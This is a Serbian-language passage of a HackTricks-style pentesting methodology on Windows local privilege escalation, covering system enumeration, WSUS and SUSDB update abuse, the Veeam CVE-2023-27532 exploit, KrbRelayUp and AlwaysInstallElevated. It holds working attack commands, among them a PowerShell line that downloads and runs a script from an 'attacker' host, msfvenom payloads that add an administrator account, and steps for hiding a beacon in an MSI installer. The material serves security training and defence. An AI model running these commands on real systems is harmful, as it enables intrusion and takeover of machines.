# Lokalna eskalacija privilegija u Windows-u

{{#include ../../banners/hacktricks-training.md}}

### **Najbolji alat za pronalaženje vektora lokalne eskalacije privilegija u Windows-u:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Ova stranica objedinjuje opštu metodologiju za eskalaciju privilegija u Windows-u iz nekoliko osnovnih vodiča.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Praktični tok enumeracije oslanja se i na radionice i kontrolne liste zajednice.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Istorijski materijal o napadima obuhvata DerbyCon prezentaciju o eskalaciji privilegija u Windows-u.<sup>[[5]](#references)</sup>

## Osnove Windows-a

### Access Tokens

**Ako ne znate šta su Windows access tokens, pročitajte sledeću stranicu pre nego što nastavite:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Više informacija o ACLs - DACLs/SACLs/ACEs potražite na sledećoj stranici:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Nivoi integriteta

**Ako ne znate šta su nivoi integriteta u Windows-u, pročitajte sledeću stranicu pre nego što nastavite:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Bezbednosne kontrole u Windows-u

U Windows-u postoje različite stvari koje vas mogu **sprečiti da izvršite enumeraciju sistema**, pokrećete izvršne datoteke ili čak **otkriti vaše aktivnosti**. Pre nego što počnete sa enumeracijom za eskalaciju privilegija, trebalo bi da **pročitate** sledeću **stranicu** i **popišete** sve ove **odbrambene** **mehanizme**:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Fizički pristup može omogućiti i da se izmena UEFI NVRAM-a van mreže pretvori u DMA pre pokretanja sistema i lanac za izmenu memorije Windows `SYSTEM`:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Admin Protection / tiha elevacija UIAccess-a

UIAccess procesi pokrenuti preko `RAiLaunchAdminProcess` mogu se zloupotrebiti za dostizanje High IL bez upita kada se zaobiđu AppInfo provere bezbedne putanje. Pogledajte namenski postupak za zaobilaženje UIAccess/Admin Protection zaštite ovde:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Propagacija registra za pristupačnost u Secure Desktop-u može se zloupotrebiti za proizvoljan upis u registar kao SYSTEM (RegPwn):<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Novije verzije Windows-a uvele su i LPE putanju **SMB arbitrary-port**, gde se privilegovana lokalna NTLM autentifikacija reflektuje preko ponovo upotrebljene SMB TCP veze:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Informacije o sistemu

### Enumeracija informacija o verziji

Proverite da li postoje poznate ranjivosti u verziji Windows-a (proverite i primenjene zakrpe).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Exploiti specifični za verziju

Ovaj [sajt](https://msrc.microsoft.com/update-guide/vulnerability) koristan je za pretragu detaljnih informacija o Microsoft bezbednosnim ranjivostima. Ova baza podataka sadrži više od 4.700 bezbednosnih ranjivosti, što pokazuje **ogromnu površinu za napad** koju predstavlja Windows okruženje.

**Na sistemu**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — popisuje verziju OS-a, instalirane ispravke i odabrane potencijalno relevantne savete; proverite tačan proizvod i naknadne ispravke pre nego što rezultat smatrate primenljivim.

Za lokalni exploit specifičan za verziju proverite **arhitekturu pokrenutog procesa**, kao i arhitekturu OS-a. Na 64-bitnom Windowsu, 32-bitni proces podleže [preusmeravanju sistema datoteka WOW64](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector): `%windir%\System32` obično upućuje na 32-bitni sistemski direktorijum, dok `%windir%\Sysnative` tom procesu omogućava pristup izvornom sistemskom direktorijumu. Ovaj alias nije dostupan 64-bitnom procesu. Verzija OS-a ili kandidat za nedostajuću KB ispravku ne dokazuju da je sistem ranjiv na exploit; uporedite verziju sistema koja je trenutno pokrenuta, instaliranu ili naknadnu ispravku, arhitekturu procesa i preduslove za exploit sa [Microsoft bezbednosnim biltenom](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) za konkretnu ranjivost.

**Lokalno, uz informacije o sistemu**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**GitHub repozitorijumi exploit-a:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Okruženje

Da li su neki credential/Juicy info podaci sačuvani u promenljivama okruženja?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### PowerShell istorija

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### PowerShell datoteke transkripta

Možete saznati kako da ovo uključite na [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` je samo primer. [PowerShell transcription policy](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) obično zapisuje fajlove u fasciklu Documents svakog korisnika, ali postavka `OutputDirectory` ili `Start-Transcript -OutputDirectory` može da preusmeri fajlove u zajedničku ili skrivenu fasciklu. Pre pregledanja transkripta proverite efektivnu izlaznu putanju i ACL fajla: može da sadrži argumente komandi i njihov izlaz, uključujući akreditive. Transkript kojem možete da pristupite predstavlja samo trag ako njegov sadržaj ne otkriva identitet sa višim privilegijama koji može da se prijavi u relevantnom kontekstu.

### PowerShell Module Logging

Detalji izvršavanja PowerShell pipeline-a se beleže, uključujući izvršene komande, pozive komandi i delove skripti. Međutim, možda neće biti zabeleženi svi detalji izvršavanja i rezultati izlaza.

Da biste ovo omogućili, pratite uputstva u odeljku „Transcript files” u dokumentaciji i izaberite **„Module Logging”** umesto **„Powershell Transcription”**.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

Da biste prikazali poslednjih 15 događaja iz PowersShell logova, možete izvršiti:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

Beleži se potpuna aktivnost i celokupan sadržaj izvršavanja skripte, čime se osigurava dokumentovanje svakog bloka koda tokom izvršavanja. Ovaj proces čuva sveobuhvatan revizijski trag svake aktivnosti, što je korisno za forenziku i analizu zlonamernog ponašanja. Beleženjem svih aktivnosti u trenutku izvršavanja pruža se detaljan uvid u proces.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Događaji evidentirani za Script Block mogu se pronaći u Windows Event Viewer-u na putanji: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Da biste prikazali poslednjih 20 događaja, možete da koristite:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### Internet podešavanja

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Diskovi

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

HTTP WSUS krajnja tačka je indikator za proveru mogućeg presretanja metapodataka ažuriranja. Eksploatacija takođe zavisi od toga da li klijent koristi taj WSUS server, da li napadač može da presretne ili kontroliše njegov saobraćaj i od klijentovih pravila za poverenje ažuriranjima i njihovu instalaciju. Sam URL ne omogućava izvršavanje koda. [Microsoft preporučuje TLS za WSUS metapodatke](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

Najpre proverite da li mreža koristi WSUS ažuriranje koje ne koristi SSL tako što ćete pokrenuti sledeću komandu u cmd:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

Ili sledeće u PowerShell-u:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

Ako dobijete odgovor poput nekog od sledećih:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

I ako je `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` ili `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` jednako `1`.

Kada je `UseWUServer` podešen na `1`, Windows Update koristi konfigurisanu intranet uslugu. To potvrđuje preduslov za putanju presretanja HTTP saobraćaja, ali ne dokazuje da je presretanje moguće, da će zlonamerna ažuriranja biti prihvaćena ili da se mogu instalirati sa povišenim privilegijama. Kada je podešen na `0`, ta konkretna konfigurisana WSUS krajnja tačka nije izabrana ovom smernicom.

Da biste iskoristili ove ranjivosti, možete koristiti alate kao što su [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- Ovo su weaponized MiTM exploit skripte za ubacivanje „lažnih“ ažuriranja u WSUS saobraćaj koji nije zaštićen SSL-om.

Istraživanje pročitajte ovde:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Kompletan izveštaj pročitajte ovde**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
Ukratko, ovo je propust koji ovaj bug iskorišćava:

> Ako možemo da menjamo proxy podešavanja lokalnog korisnika, a Windows Updates koristi proxy konfigurisan u podešavanjima Internet Explorera, možemo lokalno da pokrenemo [PyWSUS](https://github.com/GoSecure/pywsus), presretnemo sopstveni saobraćaj i pokrenemo kod kao korisnik sa povišenim privilegijama na našem sistemu.
>
> Pored toga, pošto WSUS usluga koristi podešavanja trenutnog korisnika, koristiće i njegovo skladište sertifikata. Ako generišemo samopotpisani sertifikat za WSUS ime hosta i dodamo ga u skladište sertifikata trenutnog korisnika, moći ćemo da presretnemo i HTTP i HTTPS WSUS saobraćaj. WSUS ne koristi mehanizme slične HSTS-u za implementaciju provere sertifikata po principu „veruj pri prvom korišćenju“. Ako korisnik veruje ponuđenom sertifikatu i on ima ispravno ime hosta, usluga će ga prihvatiti.

Ovu ranjivost možete iskoristiti pomoću alata [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (kada bude objavljen).

### Ažuriranja pod kontrolom WSUS administratora

Postoji zasebna putanja kada trenutni identitet može da **objavljuje i odobrava** ažuriranja na WSUS serveru. Proverite efektivno članstvo u grupi `WSUS Administrators` на серверу и сва делегирана WSUS овлашћења, затим утврдите која би група клијентских рачунара примила одобрено ажурирање. [Microsoft захтева WSUS Administrator привилегије за одобравање ажурирања](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate), а [документује и однос поверења за објављивање](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): клијенти морају да верују сертификату за потписивање који се користи за локално објављени садржај. Пре него што ово сматрате путем за ескалацију привилегија, потврдите да је кандидатско ажурирање потписано и прихваћено, да је применљиво на циљни систем и да се инсталира у контексту са вишим привилегијама. Сама HTTP вредност `WUServer` или име групе не потврђује ове услове.

### Злоупотреба прилагођених ажурирања SUSDB: непотписани payload-и преко `.txt`/`.esd`

Ово је засебан пропуст границе поверења, различит од пресретања HTTP WSUS везе: предуслов је довољан приступ **ускладиштеним процедурама WSUS базе података (`SUSDB`)** за објављивање и одобравање прилагођеног ажурирања. Једна практична почетна путања је прослеђивање налога рачунара узводног WSUS-а засебном MSSQL серверу на ком се налази `SUSDB`; тачан предуслов зависи од конкретне конфигурације, зато прво попишите дозволе `EXECUTE` уместо да претпоставите да су потребна SQL administrator права.<sup>[[38]](#references)[[39]](#references)</sup>

За засебну путању напада која прослеђује аутентификацију WSUS клијента са HTTP/8530 на LDAP, SMB или AD CS, погледајте [Злоупотреба WSUS HTTP-а за NTLM relay](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Изградња, циљање и одобравање ажурирања

Ток рада са прилагођеним ажурирањем користи легитимне WSUS процедуре као ограничени API за објављивање. Важни прелази стања су:<sup>[[38]](#references)</sup>

| Фаза | Релевантне ускладиштене процедуре |
| --- | --- |
| Увоз метаподатака ажурирања | `spImportUpdate` |
| Чување XML фрагмената предуслова, локализованог и проширеног садржаја | `spSaveXMLFragment` |
| Повезивање digest-а садржаја са URL-ом под контролом нападача | `spSetBatchURL` |
| Попис/креирање групе рачунара и додавање клијента | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Одобравање инсталације за ту групу | `spDeployUpdate` са `@actionID = 0` и `@isAssigned = 1` |

Име датотеке, digest-и, величина и руковалац `CommandLineInstallation` морају да се подударају у увезеним метаподацима и фрагментима. Након додељивања URL-а садржаја и циљне групе, коначно одобравање изгледа овако; користите нове идентификаторе ажурирања, групе и примене уместо да поново користите пример GUID-ова.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Zaobilaženje potpisa zasnovano na ekstenziji

WSUS obično odbacuje proizvoljan nepotpisan izvršni sadržaj. Međutim, u `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll`, putanja `.NET` metode `VerifyFile` postavlja zastavicu za proveru sertifikata na false kada se prosleđeno ime datoteke završava sa `.txt` ili `.esd`; `CheckCertificateSignature` se tada preskače, a da se prethodno ne utvrdi da li su bajtovi tekst ili legitimna ESD slika. Zato neizmenjeni PE fajl nazvan, na primer, `payload.exe.txt` može proći proveru sadržaja, a zatim ga može pokrenuti rukovalac za instalaciju ažuriranja preko komandne linije. Ovo je greška u politici/konfuziji tipova, a ne krivotvorenje potpisa.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### BITS-kompatibilno stagingovanje i automatizacija

Pozivanje `spDeployUpdate` navodi WSUS da preuzme registrovani sadržaj. Izvorni server mora da zadovolji očekivanja BITS-a u vezi sa HTTP-om: dostupna URL adresa sama po sebi nije dovoljna jer prenos koristi početni tok `HEAD`/`GET` i zahteve za opsege bajtova. Server bez podrške za Range izaziva WSUS događaj sinhronizacije `EventId=364`, koji navodi da BITS zahteva zaglavlje protokola Range.<sup>[[39]](#references)</sup>

Istraživački PoC [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) generiše SQL potreban za lanac import/fragment/URL/group/deployment, uključuje izmenjeni MSSQL klijent za njegovo izvršavanje i sadrži `BitsWebServer.py` za stagingovanje sadržaja. Minimalno pokretanje u ovlašćenom laboratorijskom okruženju je:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Izvršavanje bez nadzora i postojanost kroz ponovne pokušaje

Interakcija na strani klijenta zavisi od smernica. `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates`, opcija `4 - Auto download and schedule install`, omogućava da se odobrena ispravka preuzme i instalira prema podešenom rasporedu, bez ručnog izbora korisnika. Tokom testiranja, payload čija je ispravka ostala neuspešna/nepotpuna odmah je ponovo ponuđen nakon što se callback proces završio, pa ponašanje pri ponovnom pokušaju može da postane postojanost kroz ponovljeno izvršavanje; to je upadljivo jer klijent prikazuje stanje neuspele ispravke.<sup>[[39]](#references)</sup>

#### Pravci za detekciju i ojačavanje zaštite

Korisni pravci za proveru na serveru i klijentu u okviru ovog lanca su:<sup>[[39]](#references)</sup>

- Proveravajte izvršavanje `spCreateTargetGroup`, `spSetBatchURL` i `spDeployUpdate` u `SUSDB`; istražite nove grupe za ciljanje, spoljne izvore sadržaja, payloade ispravki `.txt`/`.esd` i instalacije koje su pokrenuli neočekivani principal-i (posebno nalozi koji nisu računari).
- Pregledajte `C:\Program Files\Update Services\LogFiles` u potrazi za `ContentSyncAgent`, `FileVerified`, pogrešno napisanim `FileVerficationFailed` i `EventId=364`; uporedite verifikaciju sa ekstenzijom payloada i njegovim sadržajem, umesto da verujete sufiksu.
- Tražite slučajeve ponovljenog neuspeha/pokušaja instalacije Windows Update-a, kao i izvršavanje PE-a ili neočekivanu aktivnost podređenih procesa/mreže kod sadržaja sa nazivima `.txt` ili `.esd`.
- Zahtevajte Extended Protection for Authentication na servisu baze podataka tamo gde je podržan i ograničite mrežni pristup bazi podataka na WSUS server i ovlašćene administrativne sisteme. Smanjite i proveravajte `EXECUTE` dozvole nad procedurama za prilagođene ispravke.

## Auto-updateri trećih strana i Agent IPC (lokalni privesc)

Mnogi enterprise agenti izlažu IPC površinu na localhost-u i privilegovani kanal za ažuriranje. Ako se upisivanje može usmeriti ka serveru napadača, a updater veruje lažnom root CA sertifikatu ili ima slabe provere potpisnika, lokalni korisnik može da isporuči zlonamerni MSI koji SYSTEM servis instalira. Ovde je opisana uopštena tehnika (zasnovana na Netskope stAgentSvc lancu – CVE-2025-0309):


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM preko TCP 9401)

Veeam Backup & Replication i Cloud Connect podrazumevano koriste osnovni backup servis na **TCP/9401**. [Veeam-ovo obaveštenje](https://www.veeam.com/kb4424) opisuje neautentifikovano otkrivanje šifrovanih akreditiva baze podataka konfiguracije unutar mrežnog perimetra za backup; zaseban javni PoC demonstrira putanju za izvršavanje komandi kao **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup> Servis može da se veže i za adrese koje nisu localhost, pa proverite njegovu stvarnu adresu i PID.

- **Izviđanje**: potvrdite da TCP/9401 pripada procesu `Veeam.Backup.Service.exe`, a zatim proverite instalirani proizvod i metapodatke zakrpa. `netstat -ano | findstr 9401` i `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` jesu korisni pokazatelji, ali nisu potpuna provera zakrpa.
- **Prve ispravljene verzije**: Veeam navodi **11a build 11.0.1.1261 P20230227** i **12 build 12.0.0.1420 P20230223** kao prva ispravljena izdanja; ranija izdanja su pogođena. Verzija datoteke sa četiri dela sama po sebi ne može da razlikuje nezakrpljeni osnovni build od kasnije zakrpe na istom broju build-a. Pre nego što proglasite granični build ispravljenim, proverite identifikator zakrpe u [istoriji build-ova proizvođača](https://www.veeam.com/kb2680).
- **Exploit**: smestite PoC kao što je `VeeamHax.exe`, zajedno sa potrebnim Veeam DLL-ovima, u isti direktorijum, a zatim pokrenite SYSTEM payload preko lokalnog socket-a:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

Citirani PoC pokazuje izvršavanje komandi kao SYSTEM kada su ispunjeni dodatni preduslovi; savetodavno obaveštenje dobavljača opisuje problem otkrivanja akreditiva.
## KrbRelayUp

Lokalni Kerberos relay može da omogući prelazak sa prijave sa nižim privilegijama na upis u privilegovani direktorijum kada se odgovarajući COM server autentifikuje, a relay-ovani principal ima prava nad ciljanim objektom. [KrbRelay dokumentuje](https://github.com/cube0x0/KrbRelay) LDAP upise za RBCD i `msDS-KeyCredentialLink` (shadow-credential); KrbRelayUp automatizuje neke od ovih puteva. RBCD lanac zahteva primenljivu delegaciju i prava nad ciljanim objektom, dok shadow-credential lanac zahteva prava za upis key-credential podataka i KDC koji podržava putanju autentifikacije pomoću sertifikata. Nijedan od ovih puteva ne proizlazi samo iz članstva u domenu.

Proverite smernice stvarnog DC-a za [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) i [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding), ACL objekta za relay-ovani identitet i nivoe autentifikacije i impersonation izabrane COM klase. Važni su tip prijave pozivaoca i kontekst akreditiva: WinRM sesija može da se ponaša drugačije od interaktivne prijave ili prijave sa novim akreditivima. Rutiranje kroz firewall/OXID i instalirana ažuriranja takođe mogu da utiču na rezultat. Permisivnu smernicu ili odgovarajući ACL tretirajte kao nešto što treba proveriti; pasivna enumeracija ne bi trebalo da pokreće COM coercion, relay autentifikaciju ili upise u direktorijum. Shadow credential naloga računara može da dovede do machine ticket-a i, samo ako taj nalog ima potrebna prava za replikaciju direktorijuma, do zasebne DCSync putanje.

Pronađite **exploit na** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Za više informacija o toku napada pogledajte [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

## AlwaysInstallElevated

**Ako** su ova 2 ključa registra **omogućena** (vrednost je **0x1**), korisnici sa bilo kojim nivoom privilegija mogu da **instaliraju** (izvršavaju) `*.msi` datoteke kao NT AUTHORITY\\**SYSTEM**.

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

Ako imate meterpreter sesiju, ovu tehniku možete automatizovati pomoću modula **`exploit/windows/local/always_install_elevated`**

### PowerUP

Koristite komandu `Write-UserAddMSI` iz power-up-a da biste u trenutnom direktorijumu kreirali Windows MSI binarnu datoteku za eskalaciju privilegija. Ova skripta ispisuje unapred kompajlirani MSI instalater koji traži dodavanje korisnika/grupe (zato će vam biti potreban GIU pristup):

```
Write-UserAddMSI
```

Samo pokrenite kreirani binarni fajl da biste eskalirali privilegije.

### MSI Wrapper

Pročitajte ovaj vodič da biste saznali kako da napravite MSI wrapper pomoću ovog alata. Imajte na umu da možete da upakujete „**.bat**“ fajl ako samo želite da **izvršite** **komandne linije**.


{{#ref}}
msi-wrapper.md
{{#endref}}

### Kreiranje MSI-ja pomoću WIX-a


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Kreiranje MSI-ja pomoću Visual Studio-a

- Pomoću Cobalt Strike-a ili Metasploit-a **generišite** novi **Windows EXE TCP payload** u `C:\privesc\beacon.exe`
- Otvorite **Visual Studio**, izaberite **Create a new project** i unesite „installer“ u polje za pretragu. Izaberite projekat **Setup Wizard** i kliknite na **Next**.
- Unesite naziv projekta, na primer **AlwaysPrivesc**, izaberite `C:\privesc` kao lokaciju, označite **place solution and project in the same directory** i kliknite na **Create**.
- Klikćite na **Next** dok ne stignete do koraka 3 od 4 (izbor fajlova koje treba uključiti). Kliknite na **Add** i izaberite Beacon payload koji ste upravo generisali. Zatim kliknite na **Finish**.
- Označite projekat **AlwaysPrivesc** u **Solution Explorer-u** i u **Properties** promenite **TargetPlatform** sa **x86** na **x64**.
  - Možete da promenite i druga svojstva, kao što su **Author** i **Manufacturer**, kako bi instalirana aplikacija izgledala legitimnije.
- Kliknite desnim tasterom miša na projekat i izaberite **View > Custom Actions**.
- Kliknite desnim tasterom miša na **Install** i izaberite **Add Custom Action**.
- Dvaput kliknite na **Application Folder**, izaberite fajl **beacon.exe** i kliknite na **OK**. Time ćete obezbediti da se Beacon payload izvrši čim se pokrene instalacioni program.
- U odeljku **Custom Action Properties** promenite **Run64Bit** na **True**.
- Na kraju, **izgradite projekat**.
  - Ako se prikaže upozorenje `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, proverite da li ste postavili platformu na x64.

### MSI instalacija

Da biste **u pozadini** pokrenuli **instalaciju** zlonamernog `.msi` fajla:

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

Da biste iskoristili ovu ranjivost, možete koristiti: _exploit/windows/local/always_install_elevated_

## Antivirus i detektori

### Podešavanja revizije

Ova podešavanja određuju šta se **beleži**, zato treba da obratite pažnju.

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwarding — zanimljivo je znati gde se šalju logovi.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS** je osmišljen za **upravljanje lozinkama lokalnih Administrator naloga**, čime se obezbeđuje da svaka lozinka bude **jedinstvena, nasumično generisana i redovno ažurirana** na računarima pridruženim domenu. Ove lozinke se bezbedno čuvaju u Active Directory-ju i mogu im pristupiti samo korisnici kojima su dodeljene dovoljne dozvole putem ACL-ova, što im omogućava da vide lozinke lokalnih administratora ako su ovlašćeni.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Ako je aktivan, **lozinke u čistom tekstu čuvaju se u LSASS-u** (Local Security Authority Subsystem Service).\
[**Više informacija o WDigest-u na ovoj stranici**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### LSA zaštita

Počevši od **Windows 8.1**, Microsoft je uveo poboljšanu zaštitu za Lokalni bezbednosni autoritet (LSA) kako bi **blokirao** pokušaje nepouzdanih procesa da **čitaju njegovu memoriju** ili ubacuju kod, čime se dodatno štiti sistem.\
[**Više informacija o LSA zaštiti**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

**Credential Guard** je uveden u **Windows 10**. Njegova svrha je da zaštiti akreditive sačuvane na uređaju od pretnji kao što su napadi pass-the-hash. [**Više informacija o Credential Guard-u dostupno je ovde.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Keširani akreditivi

